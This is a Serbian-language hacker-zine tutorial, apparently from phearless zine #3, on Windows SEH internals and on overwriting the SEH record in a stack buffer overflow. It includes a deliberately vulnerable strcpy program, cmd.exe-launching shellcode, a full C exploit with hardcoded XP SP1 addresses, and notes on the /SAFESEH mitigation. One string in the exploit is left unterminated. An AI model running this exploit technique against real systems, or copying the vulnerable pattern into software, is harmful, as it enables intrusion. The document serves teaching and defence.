@@ -1,0 +1,539 @@
+
+                            ...................
+                      ...::: phearless zine #3 :::...
+
+.................>---[ Exploiting Stack BOF over SEH ]---<..................
+
+............................>---[ by `and ]---<.............................
+		                                im_happy_icefor[at]yahoo[dot]com 
+
+
+   [1] Intro
+   [2] Sta je SEH ?
+   [3] Sta se desava kada se desi Exception ?
+   [4] Kako da instaliramo "exception handler" ? Primer
+   [5] Stack Overflow
+   [6] Vuln\Exploit example
+   [7] /SAFESEH
+   [8] Outro
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 1. Intro
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Zdravo, evo nasao sam temu za razmisljanje pa rekoh da to bacim na "papir"
+i podelim sa vama. Da bi me pratili potrebno vam je da ste upoznati sa 
+Stack BOF-om i naravno da znate "pomalo" C\Asm ... Ja koristim VC 6++ i 
+WindowsXP Sp1...
+
+Prica pocinje tako sto vas moram upoznati sa nekim mehanizmima operativnog 
+systema kao sto su TIB\TEB i SEH.
+
+Thread Information Block (TIB) ili Thread Environment Block (TEB) su jedna 
+ista stvar samo se TIB zove kod Win95\98 a TEB kod WinNT systema. Sluzi 
+kao sto samo ime kaze za smestanje podataka o nekom thread-u. Pristupanje 
+se vrsi preko FS registra.
+
+Evo nekih zanimljivih sekcija u TEB-u :
+
+--------------------------------------------------------------------------
+ - 00h DWORD pvExcept polje sadrzi pointer na Structured Exception 
+                      Handling strukturu
+--------------------------------------------------------------------------
+ - 04h DWORD pvStackUserTop polje sadrzi najvecu adresu thread stacka
+--------------------------------------------------------------------------
+ - 08h DWORD pvStackUserBase polje sadrzi adresu najnize trenutno 
+                             izrsavane stranice na stacku 
+--------------------------------------------------------------------------
+ - 10h DWORD FiberData polje sadrzi podatak o verziji systema na kojem je 
+                             predvidjen da radi neki thread
+--------------------------------------------------------------------------
+ - 14h DWORD pvArbitrary polje je ostavljeno za smestanje bilo cega, tj 
+                         aplikacija ga moze koristiti za bilo sta
+--------------------------------------------------------------------------
+ - 18h DWORD ptibSelf polje sadrzi pointer na samog sebe (pointer na TIB)
+--------------------------------------------------------------------------
+ - 20h DWORD processID polje sadrzi processID
+--------------------------------------------------------------------------
+ - 24h DWORD threadID polje sadrzi thread's ID
+--------------------------------------------------------------------------
+ - 2Ch DWORD pvTLSArray polje sadrzi pointer na Thread Local Storage (TLS) 
+--------------------------------------------------------------------------
+
+Videli smo da registar FS pokazuje na TEB, a FS:[0] pokazuje na 
+"Structured Exception Handler" ( SEH ). 
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 2. Sta je SEH ?
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+SEH je zamisljem kao mehanizam koji ce obavestavati korisnika o greskama u
+programima i ujedno ih zaobilaziti ako je to moguce. Radi tako sto 
+aplikacija ili OS instaliraju "callback" rutine nazvane "exception 
+handlers", a instaliraju ih u trenutku izvrsavanja programa ( run-time ),
+i ako dodje do exception-a OS poziva SEH tj neku od "callback" rutina i 
+dalje prepusta njima da se pobrinu oko resavanja problema.
+
+
+Ako se problem ne moze resiti preko nekog "exception handler-a", 
+SEH omogucava da se aplikacija zatvori na sto bezbedniji nacin 
+( cuvanje podataka, oslobadjanje memorije, ... )
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 3. Sta se desava kada se desi Exception ?
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Kada se desi "exception" windows odlucuje da li ce se exception proslediti 
+"exception handleru" ako se prosledjuje onda se program zaustavlja i salje 
+se EXCEPTION_DEBUG_EVENT debageru. Ako program nije debagovan system salje
+exception "per-thread" handleru na koji pokazuje FS:[0], exception handler 
+obradjuje exception ili ako nije u mogucnosti da ga obradi salje ga 
+sledecem handleru u lancu. Ako nijedan handler ne moze da obradi exception 
+on se ponovo salje debageru. U slucaju da i on ponovo ne moze da obradi 
+exception poziva se finalni exception handler koji je postavljen sa API 
+funkcijom SetUnhandledExceptionFilter. U slucaju da i tada ne dolazi do 
+obrade exception-a pojavljuje se MSGBOX koji nas obavestava o exception-u i 
+po nekad postoji mogucnost da se program debaguje, u slucaju da se program
+ne moze debagovati poziva se ExitProcess i program se obustavlja.
+
+Spomenuo sam da se poziva sledeci handler u lancu tj to se zove 
+"Stack Unwind" ! 
+Da bi ovo bolje razumeli moramo da vidimo na sta ustavri pokazuje FS:[0] :
+
+
+_EXCEPTION_REGISTRATION struc
+     prev    dd      ?
+     handler dd      ?
+ _EXCEPTION_REGISTRATION ends
+
+
+U ovoj strukturi "handler" je pointer na  "_except_handler callback" 
+strukturu koja je zaduzena za rad sa exception-ima. Pointer "prev" pokazuje
+na sledeci exception handler u slucaju da prvi ( tj zadnji instaliran na 
+koji pokazuje "handler" ) nije zaduzen za tu vrstu exceptiona.
+
+Znaci ako taj handler ne moze da obradi exception poziva se handler na koji
+pokazuje ponter "prev", sto bi moglo da se prikaze na primeru ...
+
+ Imamo neki program kod kojeg imamo tri funkcije A,B,C i u svakoj funkciji
+ imamo instaliram handler, sto bi na stacku izgledalo ovako :
+
+           Stack :
+ ---------------------------
+ | Funkcija C :            |   /--> _EXCEPTION_REGISTRATION struc
+ |              Some Code  |   |     prev    dd      ? -------------\
+ |              Handler 3 -----/     handler dd      ?              |
+ |              Some Data  |        _EXCEPTION_REGISTRATION ends    |
+ |-------------------------|                                        |
+ |              RET C      |                                        |
+ | Funkcija B :            |   /--> _EXCEPTION_REGISTRATION struc   |
+ |              Some Code  |   |     prev    dd      ? -------------|----\
+ |              Handler 2 -----/     handler dd      ? <------------/    |
+ |              Some Data  |       _EXCEPTION_REGISTRATION ends          |
+ |-------------------------|                                             |
+ |              RET B      |                                             |
+ | Funkcija A  :           |   /--> _EXCEPTION_REGISTRATION struc        |
+ |              Some Code  |   |     prev    dd      ?                   |
+ |              Handler 1 -----/     handler dd      ? <-----------------/
+ |              Some Data  |       _EXCEPTION_REGISTRATION ends
+ |-------------------------|
+ |              RET A      |
+ |              ...        |
+ |              ...        |
+
+
+Ako se desi exception u funkciji 3 poziva se Handler 3 u slucaju da on ne 
+moze da obradi exception poziva se Handler 2 jer na njega pokazuje pointer 
+"prev", zatim ako i on ne moze da obradi exception poziva se Handler 1, u 
+slucaju da Handler 1 moze da obradi exception moze se desiti da treba da 
+"sredi" neke podatke u Funkciji B ili C i to moze da uradi takozvanom 
+"Unwind" taktikom, tj ponovo ce pozvati ostale handlere u lancu.
+
+"Unwind" se inicijalizira API funkcijom RtlUnwind ili u Asm-u bi to 
+izgledalo ovako :
+
+PUSH Return value   
+PUSH pExceptionRecord
+PUSH OFFSET CodeLabel 
+PUSH LastStackFrame 
+CALL RtlUnwind
+
+Return value - return vrednost funkciji ( ne koristi se )
+
+pExceptionRecord - pointer na exception record
+
+CodeLabel - mesto gde se nastavlja tok programa posle Unwind-a obicno je 
+            to adresa odmah posle poziva API-a
+
+LastStackFrame - stack frame gde se zavrsava "Unwind"
+
+
+Ovde jos mozemo da pogledamo kako izgleda struktura exception handlera :
+ 
+ EXCEPTION_DISPOSITION
+ __cdecl _except_handler(
+     struct _EXCEPTION_RECORD *ExceptionRecord,
+     void * EstablisherFrame,
+     struct _CONTEXT *ContextRecord,
+     void * DispatcherContext
+     );
+
+Ovde nam je interesantan prvi parametar a to je EXCEPTION_RECORD struktura
+koja izgleda ovako :
+
+typedef struct _EXCEPTION_RECORD {
+ DWORD ExceptionCode;
+ DWORD ExceptionFlags;
+ struct _EXCEPTION_RECORD *ExceptionRecord;
+ PVOID ExceptionAddress;
+ DWORD NumberParameters;
+ DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
+ }  EXCEPTION_RECORD;
+
+Ovde su nam od parametra zanimljivi ExceptionCode koji predstavlja 
+indetifikacioni broj exception-a koji je OS dodelio :
+
+C0000005h  Read or write memory violation
+C0000094h  Divide by zero 
+C00000FDh  The stack went beyond the maximum available size
+80000001h  Violation of a guard page in memory set up using Virtual Alloc 
+C0000025h  A non-continuable exception ? the handler should not try to 
+           deal with it 
+C0000026h  Exception code used the by system during exception handling 
+80000003h  Breakpoint occurred because there was an INT3 in the code 
+80000004h  Single step during debugging
+
+ ps Ovo sam ostavio na engleskom jer je mnogo glupo kad se prevede na 
+        srsko-hrvatski
+
+
+ExceptionFlags :
+
+ 0 Exception se moze popraviti
+ 1 Exception se ne moze popraviti
+ 2 Stack Unwid-ing
+
+ExceptionAddress je adresa gde se desio exception.
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 4. Kako da instaliramo "exception handler" ? Primer
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+#include <windows.h>
+#include <stdio.h>
+
+DWORD  scratch;
+
+EXCEPTION_DISPOSITION
+__cdecl
+_except_handler(
+    struct _EXCEPTION_RECORD *ExceptionRecord,
+    void * EstablisherFrame,
+    struct _CONTEXT *ContextRecord,
+    void * DispatcherContext )
+{
+    printf( "Sada smo u exception handler-u !\n" );
+    ContextRecord->Eax = (DWORD)&scratch;  // Menjamo EAX na neku
+    return ExceptionContinueExecution;     // "normalnu" adresu
+}
+
+
+int main()
+{
+    DWORD handler = (DWORD)_except_handler;
+
+    // Instaliramo Exception Handler
+    __asm
+    {                           // Pravimo jedan exception handler
+        push    handler         // Adresa handler-a
+        push    FS:[0]          // Adresa predhodnog handler-a
+        mov     FS:[0],ESP      // Instal EXECEPTION_REGISTRATION
+    }
+
+    // Izazivamo gresku u programu
+    __asm
+    {
+        mov     eax,0           // Eax = 0
+        mov     [eax], 1        // Pokusavamo da upisemo 1 na adresi
+    }                           // 00000000
+
+    printf( "Posle exception-a !\n" );
+
+
+    // Brisemo Exception Handler
+    __asm
+    {                           // Brisemo EXECEPTION_REGISTRATION record
+        mov     eax,[ESP]       // Uzimamo pointer predhodnog record-a
+        mov     FS:[0], EAX     // Instaliramo prethodni record
+        add     esp, 8          // Brisemo EXECEPTION_REGISTRATION
+    }
+
+    return 0;
+} 
+
+
+Ovaj program je veoma jednostavan, prvo smo instalirali nas 
+"exception handler", zatim smo izazvali namerno exception upisivanjem 
+vrednosti na nepostojecoj adresi, i na kraju brisemo nas handler sa steka.
+Nas handler ispravlja gresku u programu menjajuci adresu registra EAX na 
+neku po kojoj je moguce pisati i obavestava nas da se izvrsava stampanjem 
+poruke.
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 5. Stack Overflow
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Buffer Overflow nastaje kada u neki prostor na steku za koji je rezervisan
+odredjeni deo memorije ubacimo vise podataka nego sto je predvidjeno i 
+time prepisemo neki deo neke druge variable ili neki od registra EBP/ESP 
+ili neki drugi deo koda koji ne bismo smeli prepisati. Ova ranjivost 
+omogucava menjanje Instruction Pointera [EIP] i samim tim izvrsavanje 
+naseg koda.
+
+Da ne duzim sa ovim ( jer nije tema dana :) procitajte moj tut o 
+Stack overflow-u ... 
+Google pa : w32sbofflfba.pdf, ili mi posaljite e-mail na :
+im_happy_icefor@yahoo.com 
+
+Kako u nekim slucajevima nije moguce direktno prepisivanje EIP registra, 
+moramo se snalaziti na druge nacine tj u ovom slucaju instaliranjem svog 
+"Exception Handlera" i izvrsavanjem istog. 
+
+Ili kako bi drugacije rekli : Izvrsicemo overflow sve do Exception 
+Handlera, prepisati ga da pokazuje na adresu na kojoj smo tokom overflowa 
+postavili nas shellcode.
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 6. Vuln\Exploit example
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Postoji mnogo primera koje mozemo da exploatisemo ali evo ja cu uzeti 
+jedan malo prostiji ( jer je ipak ovaj txt za pocetnike :) :
+
+
+//lameseh2.c//
+
+#include<stdio.h>
+#include<string.h>
+#include<windows.h>
+
+int ExceptionHandler(void);
+int main(int argc,char *argv[]){
+
+	char temp[70];
+
+if (argc != 2) exit(0);
+
+ __try {
+
+	strcpy(temp,argv[1]);
+
+	} __except ( ExceptionHandler() ){
+}
+return 0;
+}
+int ExceptionHandler(void){
+printf("Exception");
+return 0;
+}
+
+
+Dakle vidimo da mozemo izvrsiti overflow ( jer imamo ranjivu funkciju 
+strcpy() ) i samim tim mozemo da prepisemo SEH.
+
+
+Pogledajmo kako izgleda stek :
+
+...
+[junk                        ]
+[buf                         ]
+[junk                        ]
+[pointer to next SEH record  ]
+[pointer to exception handler]
+[junk                        ]
+...
+
+
+U trenutku kada je napravljen exception poziva se funkcija za rad sa 
+exeptio-nima na koju pokazuje "pointer to exception handler", a to dakle 
+znaci da ako ovu adresu prepisemo mozemo promeniti tok programa tj 
+usmeriti ga da izvrsi nas kod.
+
+
+Pa kada znamo sada sve ovo ajde da napisemo exploit ... 
+
+Prvo nam treba shellcode, a to ce da bude jedan jednostavan kod koji 
+pokrece cmd.exe i izgleda ovako :
+
+\x55\x8B\xEC\x33\xFF\x57\xC6\x45\xFC\x63\xC6\x45\xFD\x6D\xC6\x45\xFE\x64
+\x57\xC6\x45\xF8\x01\x8D\x45\xFC\x50\xB8\x35\xFD\xE6\x77\xFF\xD0\xCC
+
+Dalje sto treba da znamo to je da kada se desi neki overflow na XPSP1 
+registar EBX pokazuje na SEH record za taj handler, takodje XOR-uju se 
+svi registry ( tj svi registry menjaju svoju vrednost u 00000000 ), i to 
+na prvi pogled izgleda kao problem ali nije ... Ako pogledamo stack 
+videcemo da ESP+8 pokazuje na SEH record a to jednostavno znaci da treba 
+izvrsiti sledece instrukcije :
+
+pop register 
+pop register 
+RET
+
+Sto bi bilo isto kao i JMP EBX, adresa na kojoj se nalazi ova instrukcija 
+je na XPSP1 0x77FA8CD5 ...
+
+Ok, znaci stack izgleda ovako :
+
+...
+[junk                        ]     
+[buf                         ]  <--Ovde cemo staviti na shellcode--\
+[junk                        ]  <--------------+NOPs---------------|
+[pointer to next SEH record  ]  0xEB069090 // Skoci 6by napred     |
+[pointer to exception handler]  0x77FA8CD5 // Povratna adresa -----/
+[junk                        ]
+...
+
+Pointer na sledeci SEH record menjamo adresom intrukcije koja skace preko 
+fake handlera.
+
+Dalje treba da nadjemo gde se nalazi nas exception handler tj da vidimo 
+"koliki" overflow treba da izvrsimo. To cemo uraditi sa OllyDebuger-om 
+( vi mozete i neki drugim ali meni je ovako najlakse ), otvorite prog i 
+onda na Debug -> Arguments, i ovde sada proizvoljno upisujte argumente sve
+dok ne izvrisite overflow ( u ovom slucaju 70 znakova ), kada to uradite 
+posmatrajte stack window i nastavite oveflow sve dok ne naidjete na nesto 
+slicno ovome :
+
+0012FFAC   ????????
+0012FFB0   ????????
+0012FFB4   00401530  lameseh2.__except_handler3
+0012FFB8   00420148  lameseh2.00420148
+0012FFBC   ????????
+0012FFC0   ????????
+
+Tada mozete da vidite tj da izbrojite koliko je udaljen vas "exception 
+handler" od pocetka bafera koji popunjavate. Kada to saznate ( u mom 
+slucaju je to 208 ) mozete krenuti sa pisanjem exploita :
+
+
+//exploit2.c//
+
+
+#include <stdio.h>
+#include <string.h>
+
+main()
+{
+char filename[] = "lameseh2.exe "; // Ime naseg ranjivog programa + razmak
+
+char shellcode[] = "\x55\x8B\xEC\x33\xFF\x57"
+                   "\xC6\x45\xFC\x63" //c 63
+                   "\xC6\x45\xFD\x6D" //m 6D
+                   "\xC6\x45\xFE\x64" //d 64
+                   "\x57\xC6\x45\xF8"
+                   "\x01\x8D\x45\xFC\x50\xB8"
+                   "\x35\xFD\xE6\x77" // WinExec()
+                   "\xFF\xD0\xCC";    // 35 by
+
+char nops[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+              "\x90\x90\x90\x90\x90;                        
+
+// shellcode + nops 208 by
+
+char sehrecord[] = "\x90\x90\x06\xEB";
+char retn[]      = "\xD5\x8C\xFA\x77";
+
+static char buffer[1000];  
+strcat(buffer,filename);   
+strcat(buffer,nops);       
+strcat(buffer, shellcode); 
+strcat(buffer,sehrecord);
+strcat(buffer,retn);
+system(buffer);           
+}
+
+I kada pokrenemo ovaj exploit pokrenucemo cmd.exe ! Ok ovo je bio jedan 
+jednostavan primer da vam demonstrira kako o sve radi ! Predlazem vam da 
+sve to pokusate pod malo drugacijim uslovima da bi sve to bolje razumeli 
+:)
+ 
+///////////////////////////////////////////////////////////////////////////
+--==<[ 7. /SAFESEH
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+E jos sta treba da vam kazem to je da postoji mehanizam zastite protiv
+ove vrste exploatisanja programa. A to je takozvani /SAFESEH flag kod 
+compilera koji je ubacen od Visual Studio.NET 2003 verzije i nalazi se
+takodje u XP service pack 2.
+
+Da bi se se "exception handler" funkcija pozvala mora biti markirana sa
+specijalnim atributom ( SAFESEH ) za vreme linkovanja programa i samim
+tim pojavice se u "Safe Exception Handler Table". Ovo unapredjenje
+onemogucava exploite koji koriste buffer overflow sa ciljem da prepisu
+exception handler da ubace svoj kod i postave pointer na njega, tako sto 
+se svaki handler trazi u Tabeli i ako nije registrovan ne izvrsava se.
+
+Evo jednog malog primera kako da ubacite svoj handler u SAFESEH table :
+
+// Neki kao nas handler //
+// ...                  //
+
+extern "C" EXCEPTION_DISPOSITION __cdecl 
+
+MyExceptionFilter(  
+
+      EXCEPTION_RECORD *pExceptionRecord,
+      EXCEPTION_REGISTRATION_RECORD *pEstablisherFrame,
+      CONTEXT *pContext,
+      void *DispatcherContext
+
+      )
+
+{
+      ...
+      return ExceptionContinueSearch; 
+}
+
+// ...                  //
+
+
+Sada napravite *.asm :
+
+MyExceptionFilter proto
+.safeseh MyExceptionFilter
+
+Onda compile *.asm (ml.exe /safeseh ...),
+i linkujete (link.exe /safeseh file ...) ... i to je to :)
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 8. Outro
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+Ok stigli smo do kraja ... Da bi iskoristili ovu ranjivost potrebno je 
+detaljno razumevanje mehanizma SEH-a pa sam se tako ja usredio vise na 
+njegovo objasnjavanje nego na samo pianje exploita i shellcoda, za to sam 
+vam vec rekao da potrazite moj tut o stack bof-u ili me cimnite na e-mail.
+
+Predlazem da procitate ove textove :
+
+- A Crash Course on the Depths of Win32 Structured Exception Handling by 
+  Matt Pietrek
+
+- http://spiff.tripnet.se/~iczelion/Exceptionhandling.html
+
+
+
+
+greetz go to : - Lena
+               - blackhatz team
